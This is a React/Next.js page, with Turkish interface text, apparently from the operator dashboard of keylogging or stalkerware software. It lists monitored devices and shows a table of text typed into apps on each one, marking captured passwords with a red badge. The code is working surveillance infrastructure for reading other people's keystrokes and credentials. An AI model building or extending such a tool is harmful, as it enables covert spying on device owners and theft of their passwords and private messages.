'use client';

import { useEffect, useState } from 'react';
import { api, InputLogItem, Device, formatDate } from '@/lib/api';

export default function InputsPage() {
  const [devices, setDevices] = useState<Device[]>([]);
  const [selectedDevice, setSelectedDevice] = useState('');
  const [entries, setEntries] = useState<InputLogItem[]>([]);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    api.getDevices().then((d) => {
      setDevices(d);
      setSelectedDevice(d[0]?.id || '');
    });
  }, []);

  useEffect(() => {
    if (!selectedDevice) { setLoading(false); return; }
    setLoading(true);
    api.getInputLogs(selectedDevice).then(setEntries).finally(() => setLoading(false));
  }, [selectedDevice]);

  return (
    <div>
      <h1 className="text-2xl font-bold mb-2">Yazılan Metinler</h1>
      <p className="text-sm text-gray-500 mb-6">Uygulamalara girilen metinler, şifreler ve adresler</p>
      {devices.length > 0 && (
        <select className="input mb-6 max-w-xs" value={selectedDevice} onChange={(e) => setSelectedDevice(e.target.value)}>
          {devices.map((d) => <option key={d.id} value={d.id}>{d.deviceName}</option>)}
        </select>
      )}
      {loading ? (
        <div className="animate-pulse text-gray-500">Yükleniyor...</div>
      ) : entries.length === 0 ? (
        <div className="card text-gray-500">Kayıt yok</div>
      ) : (
        <div className="card overflow-hidden p-0">
          <table className="w-full text-sm">
            <thead className="bg-gray-50 border-b">
              <tr>
                <th className="text-left p-4">Uygulama</th>
                <th className="text-left p-4">Alan</th>
                <th className="text-left p-4">Metin</th>
                <th className="text-left p-4">Tür</th>
                <th className="text-left p-4">Tarih</th>
              </tr>
            </thead>
            <tbody>
              {entries.map((e) => (
                <tr key={e.id} className="border-b last:border-0">
                  <td className="p-4">{e.appName || e.appPackage}</td>
                  <td className="p-4 text-gray-500">{e.fieldName || '-'}</td>
                  <td className="p-4 font-mono break-all">{e.text}</td>
                  <td className="p-4">
                    <span className={e.isPasswordField ? 'badge-red' : 'badge-gray'}>
                      {e.isPasswordField ? 'Şifre' : 'Metin'}
                    </span>
                  </td>
                  <td className="p-4 text-gray-500">{formatDate(e.timestamp)}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}
    </div>
  );
}
